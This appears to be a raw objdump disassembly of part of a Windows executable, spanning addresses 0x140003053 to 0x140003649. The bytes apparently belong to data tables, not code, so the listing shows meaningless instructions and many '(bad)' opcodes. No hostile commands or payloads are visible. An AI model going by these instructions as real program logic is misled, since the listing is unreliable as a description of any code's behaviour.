   140003053:	02 ac 02 06 06 57 02 	add    0x2570606(%rdx,%rax,1),%ch
   14000305a:	c7 02 56 80 35 02    	movl   $0x2358056,(%rdx)
   140003060:	ca 02 56             	lret   $0x5602
   140003063:	80 b3 01 ca 02 56 80 	xorb   $0x80,0x5602ca01(%rbx)
   14000306a:	2f                   	(bad)
   14000306b:	02 ca                	add    %dl,%cl
   14000306d:	02 56 80             	add    -0x80(%rsi),%dl
   140003070:	1a 02                	sbb    (%rdx),%al
   140003072:	ca 02 56             	lret   $0x5602
   140003075:	80 08 02             	orb    $0x2,(%rax)
   140003078:	ca 02 56             	lret   $0x5602
   14000307b:	80 11 02             	adcb   $0x2,(%rcx)
   14000307e:	ca 02 56             	lret   $0x5602
   140003081:	80 fc 01             	cmp    $0x1,%ah
   140003084:	ca 02 06             	lret   $0x602
   140003087:	06                   	(bad)
   140003088:	57                   	push   %rdi
   140003089:	02 c7                	add    %bh,%al
   14000308b:	02 56 80             	add    -0x80(%rsi),%dl
   14000308e:	ab                   	stos   %eax,(%rdi)
   14000308f:	01 ce                	add    %ecx,%esi
   140003091:	02 56 80             	add    -0x80(%rsi),%dl
   140003094:	8c 01                	mov    %es,(%rcx)
   140003096:	ce                   	(bad)
   140003097:	02 56 80             	add    -0x80(%rsi),%dl
   14000309a:	99                   	cltd
   14000309b:	01 ce                	add    %ecx,%esi
   14000309d:	02 56 80             	add    -0x80(%rsi),%dl
   1400030a0:	45 02 ce             	add    %r14b,%r9b
   1400030a3:	02 56 80             	add    -0x80(%rsi),%dl
   1400030a6:	26 02 ce             	es add %dh,%cl
   1400030a9:	02 56 80             	add    -0x80(%rsi),%dl
   1400030ac:	3c 02                	cmp    $0x2,%al
   1400030ae:	ce                   	(bad)
   1400030af:	02 56 80             	add    -0x80(%rsi),%dl
   1400030b2:	a1 01 ce 02 56 80 4d 	movabs 0xce024d805602ce01,%eax
   1400030b9:	02 ce 
   1400030bb:	02 56 80             	add    -0x80(%rsi),%dl
   1400030be:	ff 06                	incl   (%rsi)
   1400030c0:	ce                   	(bad)
   1400030c1:	02 56 80             	add    -0x80(%rsi),%dl
   1400030c4:	12 07                	adc    (%rdi),%al
   1400030c6:	ce                   	(bad)
   1400030c7:	02 56 80             	add    -0x80(%rsi),%dl
   1400030ca:	27                   	(bad)
   1400030cb:	07                   	(bad)
   1400030cc:	ce                   	(bad)
   1400030cd:	02 48 20             	add    0x20(%rax),%cl
   1400030d0:	00 00                	add    %al,(%rax)
   1400030d2:	00 00                	add    %al,(%rax)
   1400030d4:	91                   	xchg   %eax,%ecx
   1400030d5:	00 c1                	add    %al,%cl
   1400030d7:	08 d2                	or     %dl,%dl
   1400030d9:	02 01                	add    (%rcx),%al
   1400030db:	00 c8                	add    %cl,%al
   1400030dd:	20 00                	and    %al,(%rax)
   1400030df:	00 00                	add    %al,(%rax)
   1400030e1:	00 91 00 1c 03 d8    	add    %dl,-0x27fce400(%rcx)
   1400030e7:	02 03                	add    (%rbx),%al
   1400030e9:	00 44 21 00          	add    %al,0x0(%rcx,%riz,1)
   1400030ed:	00 00                	add    %al,(%rax)
   1400030ef:	00 91 00 d8 03 dd    	add    %dl,-0x22fc2800(%rcx)
   1400030f5:	02 04 00             	add    (%rax,%rax,1),%al
   1400030f8:	5c                   	pop    %rsp
   1400030f9:	21 00                	and    %eax,(%rax)
   1400030fb:	00 00                	add    %al,(%rax)
   1400030fd:	00 91 00 41 0b e1    	add    %dl,-0x1ef4bf00(%rcx)
   140003103:	02 04 00             	add    (%rax,%rax,1),%al
   140003106:	a4                   	movsb  (%rsi),(%rdi)
   140003107:	21 00                	and    %eax,(%rax)
   140003109:	00 00                	add    %al,(%rax)
   14000310b:	00 91 00 41 0b d8    	add    %dl,-0x27f4bf00(%rcx)
   140003111:	02 06                	add    (%rsi),%al
   140003113:	00 20                	add    %ah,(%rax)
   140003115:	22 00                	and    (%rax),%al
   140003117:	00 00                	add    %al,(%rax)
   140003119:	00 91 00 fe 02 e7    	add    %dl,-0x18fd0200(%rcx)
   14000311f:	02 07                	add    (%rdi),%al
   140003121:	00 60 22             	add    %ah,0x22(%rax)
   140003124:	00 00                	add    %al,(%rax)
   140003126:	00 00                	add    %al,(%rax)
   140003128:	91                   	xchg   %eax,%ecx
   140003129:	00 65 07             	add    %ah,0x7(%rbp)
   14000312c:	e7 02                	out    %eax,$0x2
   14000312e:	07                   	(bad)
   14000312f:	00 88 22 00 00 00    	add    %cl,0x22(%rax)
   140003135:	00 91 00 30 08 eb    	add    %dl,-0x14f7d000(%rcx)
   14000313b:	02 07                	add    (%rdi),%al
   14000313d:	00 6b 23             	add    %ch,0x23(%rbx)
   140003140:	00 00                	add    %al,(%rax)
   140003142:	00 00                	add    %al,(%rax)
   140003144:	91                   	xchg   %eax,%ecx
   140003145:	18 10                	sbb    %dl,(%rax)
   140003147:	0a dd                	or     %ch,%bl
   140003149:	02 08                	add    (%rax),%cl
   14000314b:	00 98 23 00 00 00    	add    %bl,0x23(%rax)
   140003151:	00 96 00 87 0c f1    	add    %dl,-0xef37900(%rsi)
   140003157:	02 08                	add    (%rax),%cl
   140003159:	00 10                	add    %dl,(%rax)
   14000315b:	24 00                	and    $0x0,%al
   14000315d:	00 00                	add    %al,(%rax)
   14000315f:	00 86 18 0a 0a 06    	add    %al,0x60a0a18(%rsi)
   140003165:	00 0a                	add    %cl,(%rdx)
   140003167:	00 18                	add    %bl,(%rax)
   140003169:	24 00                	and    $0x0,%al
   14000316b:	00 00                	add    %al,(%rax)
   14000316d:	00 91 18 10 0a dd    	add    %dl,-0x22f5efe8(%rcx)
   140003173:	02 0a                	add    (%rdx),%cl
   140003175:	00 24 24             	add    %ah,(%rsp)
   140003178:	00 00                	add    %al,(%rax)
   14000317a:	00 00                	add    %al,(%rax)
   14000317c:	86 00                	xchg   %al,(%rax)
   14000317e:	2e 03 f8             	cs add %eax,%edi
   140003181:	02 0a                	add    (%rdx),%cl
   140003183:	00 b1 24 00 00 00    	add    %dh,0x24(%rcx)
   140003189:	00 86 18 0a 0a 06    	add    %al,0x60a0a18(%rsi)
   14000318f:	00 0b                	add    %cl,(%rbx)
   140003191:	00 b9 24 00 00 00    	add    %bh,0x24(%rcx)
   140003197:	00 86 08 3f 09 ff    	add    %al,-0xf6c0f8(%rsi)
   14000319d:	02 0b                	add    (%rbx),%cl
   14000319f:	00 c1                	add    %al,%cl
   1400031a1:	24 00                	and    $0x0,%al
   1400031a3:	00 00                	add    %al,(%rax)
   1400031a5:	00 86 08 4a 09 04    	add    %al,0x4094a08(%rsi)
   1400031ab:	03 0b                	add    (%rbx),%ecx
   1400031ad:	00 ca                	add    %cl,%dl
   1400031af:	24 00                	and    $0x0,%al
   1400031b1:	00 00                	add    %al,(%rax)
   1400031b3:	00 86 18 0a 0a 06    	add    %al,0x60a0a18(%rsi)
   1400031b9:	00 0c 00             	add    %cl,(%rax,%rax,1)
   1400031bc:	d4                   	(bad)
   1400031bd:	24 00                	and    $0x0,%al
   1400031bf:	00 00                	add    %al,(%rax)
   1400031c1:	00 c4                	add    %al,%ah
   1400031c3:	00 f6                	add    %dh,%dh
   1400031c5:	06                   	(bad)
   1400031c6:	06                   	(bad)
   1400031c7:	00 0c 00             	add    %cl,(%rax,%rax,1)
   1400031ca:	00 25 00 00 00 00    	add    %ah,0x0(%rip)        # 0x1400031d0
   1400031d0:	86 00                	xchg   %al,(%rax)
   1400031d2:	ca 08 0a             	lret   $0xa08
   1400031d5:	03 0c 00             	add    (%rax,%rax,1),%ecx
   1400031d8:	88 25 00 00 00 00    	mov    %ah,0x0(%rip)        # 0x1400031de
   1400031de:	91                   	xchg   %eax,%ecx
   1400031df:	00 18                	add    %bl,(%rax)
   1400031e1:	08 10                	or     %dl,(%rax)
   1400031e3:	03 0e                	add    (%rsi),%ecx
   1400031e5:	00 c4                	add    %al,%ah
   1400031e7:	25 00 00 00 00       	and    $0x0,%eax
   1400031ec:	86 00                	xchg   %al,(%rax)
   1400031ee:	92                   	xchg   %eax,%edx
   1400031ef:	0c 18                	or     $0x18,%al
   1400031f1:	03 11                	add    (%rcx),%edx
   1400031f3:	00 74 27 00          	add    %dh,0x0(%rdi,%riz,1)
   1400031f7:	00 00                	add    %al,(%rax)
   1400031f9:	00 86 00 65 09 ff    	add    %al,-0xf69b00(%rsi)
   1400031ff:	02 13                	add    (%rbx),%dl
   140003201:	00 90 27 00 00 00    	add    %dl,0x27(%rax)
   140003207:	00 81 00 bf 0c 06    	add    %al,0x60cbf00(%rcx)
   14000320d:	00 13                	add    %dl,(%rbx)
   14000320f:	00 2c 28             	add    %ch,(%rax,%rbp,1)
   140003212:	00 00                	add    %al,(%rax)
   140003214:	00 00                	add    %al,(%rax)
   140003216:	81 00 f2 02 1e 03    	addl   $0x31e02f2,(%rax)
   14000321c:	13 00                	adc    (%rax),%eax
   14000321e:	78 28                	js     0x140003248
   140003220:	00 00                	add    %al,(%rax)
   140003222:	00 00                	add    %al,(%rax)
   140003224:	91                   	xchg   %eax,%ecx
   140003225:	00 07                	add    %al,(%rdi)
   140003227:	09 24 03             	or     %esp,(%rbx,%rax,1)
   14000322a:	14 00                	adc    $0x0,%al
   14000322c:	9c                   	pushf
   14000322d:	28 00                	sub    %al,(%rax)
   14000322f:	00 00                	add    %al,(%rax)
   140003231:	00 86 00 c8 04 06    	add    %al,0x604c800(%rsi)
   140003237:	00 15 00 e8 28 00    	add    %dl,0x28e800(%rip)        # 0x140291a3d
   14000323d:	00 00                	add    %al,(%rax)
   14000323f:	00 86 18 0a 0a 06    	add    %al,0x60a0a18(%rsi)
   140003245:	00 15 00 fc 28 00    	add    %dl,0x28fc00(%rip)        # 0x140292e4b
   14000324b:	00 00                	add    %al,(%rax)
   14000324d:	00 c4                	add    %al,%ah
   14000324f:	00 f6                	add    %dh,%dh
   140003251:	06                   	(bad)
   140003252:	06                   	(bad)
   140003253:	00 15 00 28 29 00    	add    %dl,0x292800(%rip)        # 0x140295a59
   140003259:	00 00                	add    %al,(%rax)
   14000325b:	00 96 00 85 01 2a    	add    %dl,0x2a018500(%rsi)
   140003261:	03 15 00 63 29 00    	add    0x296300(%rip),%edx        # 0x140299567
   140003267:	00 00                	add    %al,(%rax)
   140003269:	00 96 00 ab 07 b8    	add    %dl,-0x47f85500(%rsi)
   14000326f:	00 16                	add    %dl,(%rsi)
   140003271:	00 78 29             	add    %bh,0x29(%rax)
   140003274:	00 00                	add    %al,(%rax)
   140003276:	00 00                	add    %al,(%rax)
   140003278:	81 00 65 0b 3e 00    	addl   $0x3e0b65,(%rax)
   14000327e:	17                   	(bad)
   14000327f:	00 c8                	add    %cl,%al
   140003281:	29 00                	sub    %eax,(%rax)
   140003283:	00 00                	add    %al,(%rax)
   140003285:	00 86 00 d2 02 3e    	add    %al,0x3e02d200(%rsi)
   14000328b:	00 17                	add    %dl,(%rdi)
   14000328d:	00 7b 2a             	add    %bh,0x2a(%rbx)
   140003290:	00 00                	add    %al,(%rax)
   140003292:	00 00                	add    %al,(%rax)
   140003294:	81 00 72 01 30 03    	addl   $0x3300172,(%rax)
   14000329a:	17                   	(bad)
   14000329b:	00 94 2a 00 00 00 00 	add    %dl,0x0(%rdx,%rbp,1)
   1400032a2:	81 00 97 02 34 03    	addl   $0x3340297,(%rax)
   1400032a8:	17                   	(bad)
   1400032a9:	00 e6                	add    %ah,%dh
   1400032ab:	2a 00                	sub    (%rax),%al
   1400032ad:	00 00                	add    %al,(%rax)
   1400032af:	00 81 00 ce 04 06    	add    %al,0x604ce00(%rcx)
   1400032b5:	00 17                	add    %dl,(%rdi)
   1400032b7:	00 18                	add    %bl,(%rax)
   1400032b9:	2b 00                	sub    (%rax),%eax
   1400032bb:	00 00                	add    %al,(%rax)
   1400032bd:	00 81 00 d0 03 06    	add    %al,0x603d000(%rcx)
   1400032c3:	00 17                	add    %dl,(%rdi)
   1400032c5:	00 8c 2b 00 00 00 00 	add    %cl,0x0(%rbx,%rbp,1)
   1400032cc:	86 00                	xchg   %al,(%rax)
   1400032ce:	50                   	push   %rax
   1400032cf:	03 39                	add    (%rcx),%edi
   1400032d1:	03 17                	add    (%rdi),%edx
   1400032d3:	00 00                	add    %al,(%rax)
   1400032d5:	00 00                	add    %al,(%rax)
   1400032d7:	00 80 00 91 20 83    	add    %al,-0x7cdf6f00(%rax)
   1400032dd:	02 40 03             	add    0x3(%rax),%al
   1400032e0:	19 00                	sbb    %eax,(%rax)
   1400032e2:	00 00                	add    %al,(%rax)
   1400032e4:	00 00                	add    %al,(%rax)
   1400032e6:	80 00 91             	addb   $0x91,(%rax)
   1400032e9:	20 35 03 4a 03 1d    	and    %dh,0x1d034a03(%rip)        # 0x15d037cf2
   1400032ef:	00 f4                	add    %dh,%ah
   1400032f1:	2b 00                	sub    (%rax),%eax
   1400032f3:	00 00                	add    %al,(%rax)
   1400032f5:	00 86 18 0a 0a 06    	add    %al,0x60a0a18(%rsi)
   1400032fb:	00 20                	add    %ah,(%rax)
   1400032fd:	00 2c 2c             	add    %ch,(%rsp,%rbp,1)
   140003300:	00 00                	add    %al,(%rax)
   140003302:	00 00                	add    %al,(%rax)
   140003304:	91                   	xchg   %eax,%ecx
   140003305:	18 10                	sbb    %dl,(%rax)
   140003307:	0a dd                	or     %ch,%bl
   140003309:	02 20                	add    (%rax),%ah
   14000330b:	00 48 2c             	add    %cl,0x2c(%rax)
   14000330e:	00 00                	add    %al,(%rax)
   140003310:	00 00                	add    %al,(%rax)
   140003312:	86 18                	xchg   %bl,(%rax)
   140003314:	0a 0a                	or     (%rdx),%cl
   140003316:	06                   	(bad)
   140003317:	00 20                	add    %ah,(%rax)
   140003319:	00 50 2c             	add    %dl,0x2c(%rax)
   14000331c:	00 00                	add    %al,(%rax)
   14000331e:	00 00                	add    %al,(%rax)
   140003320:	83 00 33             	addl   $0x33,(%rax)
   140003323:	00 51 03             	add    %dl,0x3(%rcx)
   140003326:	20 00                	and    %al,(%rax)
   140003328:	00 00                	add    %al,(%rax)
   14000332a:	00 00                	add    %al,(%rax)
   14000332c:	03 00                	add    (%rax),%eax
   14000332e:	86 18                	xchg   %bl,(%rax)
   140003330:	0a 0a                	or     (%rdx),%cl
   140003332:	7f 00                	jg     0x140003334
   140003334:	21 00                	and    %eax,(%rax)
   140003336:	00 00                	add    %al,(%rax)
   140003338:	00 00                	add    %al,(%rax)
   14000333a:	03 00                	add    (%rax),%eax
   14000333c:	c6 01 50             	movb   $0x50,(%rcx)
   14000333f:	03 39                	add    (%rcx),%edi
   140003341:	03 23                	add    (%rbx),%esp
   140003343:	00 00                	add    %al,(%rax)
   140003345:	00 00                	add    %al,(%rax)
   140003347:	00 03                	add    %al,(%rbx)
   140003349:	00 c6                	add    %al,%dh
   14000334b:	01 4b 03             	add    %ecx,0x3(%rbx)
   14000334e:	57                   	push   %rdi
   14000334f:	03 25 00 00 00 00    	add    0x0(%rip),%esp        # 0x140003355
   140003355:	00 03                	add    %al,(%rbx)
   140003357:	00 c6                	add    %al,%dh
   140003359:	01 41 03             	add    %eax,0x3(%rcx)
   14000335c:	64 03 29             	add    %fs:(%rcx),%ebp
   14000335f:	00 00                	add    %al,(%rax)
   140003361:	00 01                	add    %al,(%rcx)
   140003363:	00 52 04             	add    %dl,0x4(%rdx)
   140003366:	10 10                	adc    %dl,(%rax)
   140003368:	02 00                	add    (%rax),%al
   14000336a:	f5                   	cmc
   14000336b:	07                   	(bad)
   14000336c:	00 00                	add    %al,(%rax)
   14000336e:	01 00                	add    %eax,(%rax)
   140003370:	52                   	push   %rdx
   140003371:	04 00                	add    $0x0,%al
   140003373:	00 01                	add    %al,(%rcx)
   140003375:	00 52 04             	add    %dl,0x4(%rdx)
   140003378:	00 00                	add    %al,(%rax)
   14000337a:	02 00                	add    (%rax),%al
   14000337c:	ce                   	(bad)
   14000337d:	02 00                	add    (%rax),%al
   14000337f:	00 01                	add    %al,(%rcx)
   140003381:	00 52 04             	add    %dl,0x4(%rdx)
   140003384:	00 00                	add    %al,(%rax)
   140003386:	01 00                	add    %eax,(%rax)
   140003388:	ff 0a                	decl   (%rdx)
   14000338a:	00 00                	add    %al,(%rax)
   14000338c:	01 00                	add    %eax,(%rax)
   14000338e:	83 09 10             	orl    $0x10,(%rcx)
   140003391:	10 02                	adc    %al,(%rdx)
   140003393:	00 f5                	add    %dh,%ch
   140003395:	07                   	(bad)
   140003396:	00 00                	add    %al,(%rax)
   140003398:	01 00                	add    %eax,(%rax)
   14000339a:	8e 09                	mov    (%rcx),%cs
   14000339c:	00 00                	add    %al,(%rax)
   14000339e:	01 00                	add    %eax,(%rax)
   1400033a0:	c9                   	leave
   1400033a1:	06                   	(bad)
   1400033a2:	00 00                	add    %al,(%rax)
   1400033a4:	01 00                	add    %eax,(%rax)
   1400033a6:	35 08 00 00 02       	xor    $0x2000008,%eax
   1400033ab:	00 8d 0c 00 00 01    	add    %cl,0x100000c(%rbp)
   1400033b1:	00 77 09             	add    %dh,0x9(%rdi)
   1400033b4:	00 00                	add    %al,(%rax)
   1400033b6:	02 00                	add    (%rax),%al
   1400033b8:	10 0c 00             	adc    %cl,(%rax,%rax,1)
   1400033bb:	00 03                	add    %al,(%rbx)
   1400033bd:	00 b7 07 00 00 01    	add    %dh,0x1000007(%rdi)
   1400033c3:	00 52 04             	add    %dl,0x4(%rdx)
   1400033c6:	10 10                	adc    %dl,(%rax)
   1400033c8:	02 00                	add    (%rax),%al
   1400033ca:	ce                   	(bad)
   1400033cb:	08 00                	or     %al,(%rax)
   1400033cd:	00 01                	add    %al,(%rcx)
   1400033cf:	00 8e 09 00 00 01    	add    %cl,0x1000009(%rsi)
   1400033d5:	00 29                	add    %ch,(%rcx)
   1400033d7:	08 00                	or     %al,(%rax)
   1400033d9:	00 01                	add    %al,(%rcx)
   1400033db:	00 8e 09 00 00 01    	add    %cl,0x1000009(%rsi)
   1400033e1:	00 b6 0c 00 00 01    	add    %dh,0x100000c(%rsi)
   1400033e7:	00 e2                	add    %ah,%dl
   1400033e9:	07                   	(bad)
   1400033ea:	00 00                	add    %al,(%rax)
   1400033ec:	02 00                	add    (%rax),%al
   1400033ee:	95                   	xchg   %eax,%ebp
   1400033ef:	09 00                	or     %eax,(%rax)
   1400033f1:	00 01                	add    %al,(%rcx)
   1400033f3:	00 90 0b 00 00 02    	add    %dl,0x200000b(%rax)
   1400033f9:	00 ef                	add    %ch,%bh
   1400033fb:	06                   	(bad)
   1400033fc:	00 00                	add    %al,(%rax)
   1400033fe:	03 00                	add    (%rax),%eax
   140003400:	95                   	xchg   %eax,%ebp
   140003401:	04 00                	add    $0x0,%al
   140003403:	00 04 00             	add    %al,(%rax,%rax,1)
   140003406:	f0 0b 00             	lock or (%rax),%eax
   140003409:	00 01                	add    %al,(%rcx)
   14000340b:	00 90 0b 00 00 02    	add    %dl,0x200000b(%rax)
   140003411:	00 ef                	add    %ch,%bh
   140003413:	06                   	(bad)
   140003414:	00 00                	add    %al,(%rax)
   140003416:	03 00                	add    (%rax),%eax
   140003418:	66 04 00             	data16 add $0x0,%al
   14000341b:	00 01                	add    %al,(%rcx)
   14000341d:	00 14 08             	add    %dl,(%rax,%rcx,1)
   140003420:	00 00                	add    %al,(%rax)
   140003422:	01 00                	add    %eax,(%rax)
   140003424:	dc 0b                	fmull  (%rbx)
   140003426:	00 00                	add    %al,(%rax)
   140003428:	02 00                	add    (%rax),%al
   14000342a:	f7 02 00 00 01 00    	testl  $0x10000,(%rdx)
   140003430:	e2 07                	loop   0x140003439
   140003432:	00 00                	add    %al,(%rax)
   140003434:	02 00                	add    (%rax),%al
   140003436:	95                   	xchg   %eax,%ebp
   140003437:	09 00                	or     %eax,(%rax)
   140003439:	00 01                	add    %al,(%rcx)
   14000343b:	00 e2                	add    %ah,%dl
   14000343d:	07                   	(bad)
   14000343e:	00 00                	add    %al,(%rax)
   140003440:	02 00                	add    (%rax),%al
   140003442:	95                   	xchg   %eax,%ebp
   140003443:	09 00                	or     %eax,(%rax)
   140003445:	00 03                	add    %al,(%rbx)
   140003447:	00 cc                	add    %cl,%ah
   140003449:	07                   	(bad)
   14000344a:	00 00                	add    %al,(%rax)
   14000344c:	04 00                	add    $0x0,%al
   14000344e:	dc 0b                	fmull  (%rbx)
   140003450:	00 00                	add    %al,(%rax)
   140003452:	01 00                	add    %eax,(%rax)
   140003454:	35 0c 09 00 0a       	xor    $0xa00090c,%eax
   140003459:	0a 01                	or     (%rcx),%al
   14000345b:	00 11                	add    %dl,(%rcx)
   14000345d:	00 0a                	add    %cl,(%rdx)
   14000345f:	0a 06                	or     (%rsi),%al
   140003461:	00 19                	add    %bl,(%rcx)
   140003463:	00 0a                	add    %cl,(%rdx)
   140003465:	0a 0a                	or     (%rdx),%cl
   140003467:	00 29                	add    %ch,(%rcx)
   140003469:	00 0a                	add    %cl,(%rdx)
   14000346b:	0a 10                	or     (%rax),%dl
   14000346d:	00 31                	add    %dh,(%rcx)
   14000346f:	00 0a                	add    %cl,(%rdx)
   140003471:	0a 10                	or     (%rax),%dl
   140003473:	00 39                	add    %bh,(%rcx)
   140003475:	00 0a                	add    %cl,(%rdx)
   140003477:	0a 10                	or     (%rax),%dl
   140003479:	00 41 00             	add    %al,0x0(%rcx)
   14000347c:	0a 0a                	or     (%rdx),%cl
   14000347e:	10 00                	adc    %al,(%rax)
   140003480:	49 00 0a             	rex.WB add %cl,(%r10)
   140003483:	0a 10                	or     (%rax),%dl
   140003485:	00 51 00             	add    %dl,0x0(%rcx)
   140003488:	0a 0a                	or     (%rdx),%cl
   14000348a:	10 00                	adc    %al,(%rax)
   14000348c:	59                   	pop    %rcx
   14000348d:	00 0a                	add    %cl,(%rdx)
   14000348f:	0a 10                	or     (%rax),%dl
   140003491:	00 61 00             	add    %ah,0x0(%rcx)
   140003494:	0a 0a                	or     (%rdx),%cl
   140003496:	15 00 69 00 0a       	adc    $0xa006900,%eax
   14000349b:	0a 10                	or     (%rax),%dl
   14000349d:	00 71 00             	add    %dh,0x0(%rcx)
   1400034a0:	0a 0a                	or     (%rdx),%cl
   1400034a2:	10 00                	adc    %al,(%rax)
   1400034a4:	79 00                	jns    0x1400034a6
   1400034a6:	0a 0a                	or     (%rdx),%cl
   1400034a8:	10 00                	adc    %al,(%rax)
   1400034aa:	91                   	xchg   %eax,%ecx
   1400034ab:	00 0a                	add    %cl,(%rdx)
   1400034ad:	0a 06                	or     (%rsi),%al
   1400034af:	00 81 00 f6 06 06    	add    %al,0x606f600(%rcx)
   1400034b5:	00 f1                	add    %dh,%cl
   1400034b7:	00 0a                	add    %cl,(%rdx)
   1400034b9:	0a 1a                	or     (%rdx),%bl
   1400034bb:	00 11                	add    %dl,(%rcx)
   1400034bd:	01 0a                	add    %ecx,(%rdx)
   1400034bf:	0a 06                	or     (%rsi),%al
   1400034c1:	00 29                	add    %ch,(%rcx)
   1400034c3:	01 12                	add    %edx,(%rdx)
   1400034c5:	09 28                	or     %ebp,(%rax)
   1400034c7:	00 99 00 0a 0a 06    	add    %bl,0x60a0a00(%rcx)
   1400034cd:	00 99 00 e3 08 2d    	add    %bl,0x2d08e300(%rcx)
   1400034d3:	00 99 00 53 0b 33    	add    %bl,0x330b5300(%rcx)
   1400034d9:	00 99 00 eb 03 38    	add    %bl,0x3803eb00(%rcx)
   1400034df:	00 39                	add    %bh,(%rcx)
   1400034e1:	01 08                	add    %ecx,(%rax)
   1400034e3:	04 3e                	add    $0x3e,%al
   1400034e5:	00 31                	add    %dh,(%rcx)
   1400034e7:	01 15 04 10 00 41    	add    %edx,0x41001004(%rip)        # 0x1810044f1
   1400034ed:	01 97 07 42 00 31    	add    %edx,0x31004207(%rdi)
   1400034f3:	01 ad 0b 10 00 31    	add    %ebp,0x3100100b(%rbp)
   1400034f9:	01 d9                	add    %ebx,%ecx
   1400034fb:	0c 15                	or     $0x15,%al
   1400034fd:	00 31                	add    %dh,(%rcx)
   1400034ff:	01 b0 06 15 00 99    	add    %esi,-0x66ffeafa(%rax)
   140003505:	00 87 0c 47 00 99    	add    %al,-0x66ffb8f4(%rdi)
   14000350b:	00 a0 02 4b 00 99    	add    %ah,-0x66ffb4fe(%rax)
   140003511:	00 1c 0c             	add    %bl,(%rsp,%rcx,1)
   140003514:	06                   	(bad)
   140003515:	00 99 00 c8 04 06    	add    %bl,0x604c800(%rcx)
   14000351b:	00 99 00 90 02 56    	add    %bl,0x56029000(%rcx)
   140003521:	00 99 00 be 0a 5a    	add    %bl,0x5a0abe00(%rcx)
   140003527:	00 49 01             	add    %cl,0x1(%rcx)
   14000352a:	9e                   	sahf
   14000352b:	0c 60                	or     $0x60,%al
   14000352d:	00 0c 00             	add    %cl,(%rax,%rax,1)
   140003530:	0a 0a                	or     (%rdx),%cl
   140003532:	7f 00                	jg     0x140003534
   140003534:	49 01 13             	add    %rdx,(%r11)
   140003537:	0d 85 00 99 00       	or     $0x990085,%eax
   14000353c:	32 04 3e             	xor    (%rsi,%rdi,1),%al
   14000353f:	00 41 01             	add    %al,0x1(%rcx)
   140003542:	e8 09 3e 00 14       	call   0x154007350
   140003547:	00 1f                	add    %bl,(%rdi)
   140003549:	0b a3 00 41 01 28    	or     0x28014100(%rbx),%esp
   14000354f:	0b ad 00 41 01 34    	or     0x34014100(%rbp),%ebp
   140003555:	0d b2 00 61 01       	or     $0x16100b2,%eax
   14000355a:	d9 04 b8             	flds   (%rax,%rdi,4)
   14000355d:	00 14 00             	add    %dl,(%rax,%rax,1)
   140003560:	0a 0a                	or     (%rdx),%cl
   140003562:	06                   	(bad)
   140003563:	00 14 00             	add    %dl,(%rax,%rax,1)
   140003566:	bb 02 bd 00 a9       	mov    $0xa900bd02,%ebx
   14000356b:	00 b6 02 ca 00 a9    	add    %dh,-0x56ff35fe(%rsi)
   140003571:	00 78 0c             	add    %bh,0xc(%rax)
   140003574:	d1 00                	roll   $1,(%rax)
   140003576:	69 01 40 0d d7 00    	imul   $0xd70d40,(%rcx),%eax
   14000357c:	71 01                	jno    0x14000357f
   14000357e:	50                   	push   %rax
   14000357f:	03 e1                	add    %ecx,%esp
   140003581:	00 a1 00 0a 0a 06    	add    %ah,0x60a0a00(%rcx)
   140003587:	00 79 01             	add    %bh,0x1(%rcx)
   14000358a:	6d                   	insl   (%dx),(%rdi)
   14000358b:	00 f3                	add    %dh,%bl
   14000358d:	00 89 01 17 0d fa    	add    %cl,-0x5f2e8ff(%rcx)
   140003593:	00 81 00 0a 0a 06    	add    %al,0x60a0a00(%rcx)
   140003599:	00 b1 00 0a 0a 0b    	add    %dh,0xb0a0a00(%rcx)
   14000359f:	01 b1 00 e3 0b 18    	add    %esi,0x180be300(%rcx)
   1400035a5:	01 01                	add    %eax,(%rcx)
   1400035a7:	01 ac 03 25 01 a9 01 	add    %ebp,0x1a90125(%rbx,%rax,1)
   1400035ae:	5e                   	pop    %rsi
   1400035af:	04 2b                	add    $0x2b,%al
   1400035b1:	01 b1 00 bf 02 47    	add    %esi,0x4702bf00(%rcx)
   1400035b7:	00 b9 00 1c 0d 31    	add    %bh,0x310d1c00(%rcx)
   1400035bd:	01 b9 01 0a 0a 7f    	add    %edi,0x7f0a0a01(%rcx)
   1400035c3:	00 b1 01 d0 0c 37    	add    %dh,0x370cd001(%rcx)
   1400035c9:	01 c1                	add    %eax,%ecx
   1400035cb:	01 0a                	add    %ecx,(%rdx)
   1400035cd:	0a 06                	or     (%rsi),%al
   1400035cf:	00 c1                	add    %al,%cl
   1400035d1:	01 a5 0c 50 01 79    	add    %esp,0x7901500c(%rbp)
   1400035d7:	01 f6                	add    %esi,%esi
   1400035d9:	0a 56 01             	or     0x1(%rsi),%dl
   1400035dc:	41 01 4e 0d          	add    %ecx,0xd(%r14)
   1400035e0:	5c                   	pop    %rsp
   1400035e1:	01 c9                	add    %ecx,%ecx
   1400035e3:	01 22                	add    %esp,(%rdx)
   1400035e5:	04 5f                	add    $0x5f,%al
   1400035e7:	01 41 01             	add    %eax,0x1(%rcx)
   1400035ea:	c2 0b 63             	ret    $0x630b
   1400035ed:	01 d1                	add    %edx,%ecx
   1400035ef:	01 00                	add    %eax,(%rax)
   1400035f1:	01 6a 01             	add    %ebp,0x1(%rdx)
   1400035f4:	d1 01                	roll   $1,(%rcx)
   1400035f6:	f6 0a 70             	testb  $0x70,(%rdx)
   1400035f9:	01 89 01 17 0d 76    	add    %ecx,0x760d1701(%rcx)
   1400035ff:	01 a9 01 5e 04 81    	add    %ebp,-0x7efba1ff(%rcx)
   140003605:	01 b1 00 cf 06 90    	add    %esi,-0x6ff93100(%rcx)
   14000360b:	01 d9                	add    %ebx,%ecx
   14000360d:	01 05 0c 47 00 b1    	add    %eax,-0x4effb8f4(%rip)        # 0xf1007d1f
   140003613:	00 f2                	add    %dh,%dl
   140003615:	02 90 01 d1 00 d6    	add    -0x29ff2eff(%rax),%dl
   14000361b:	04 a1                	add    $0xa1,%al
   14000361d:	01 e1                	add    %esp,%ecx
   14000361f:	01 cb                	add    %ecx,%ebx
   140003621:	0a a9 01 b1 00 c8    	or     -0x37ff4eff(%rcx),%ch
   140003627:	04 06                	add    $0x6,%al
   140003629:	00 b1 00 ce 04 06    	add    %dh,0x604ce00(%rcx)
   14000362f:	00 b9 00 17 0c 06    	add    %bh,0x60c1700(%rcx)
   140003635:	00 c1                	add    %al,%cl
   140003637:	00 0a                	add    %cl,(%rdx)
   140003639:	0a 15 00 d9 00 32    	or     0x3200d900(%rip),%dl        # 0x172010f3f
   14000363f:	0a ba 01 d9 00 98    	or     -0x67ff26ff(%rdx),%bh
   140003645:	0a c0                	or     %al,%al
   140003647:	01 d9                	add    %ebx,%ecx
   140003649:	00 7d 0b             	add    %bh,0xb(%rbp)
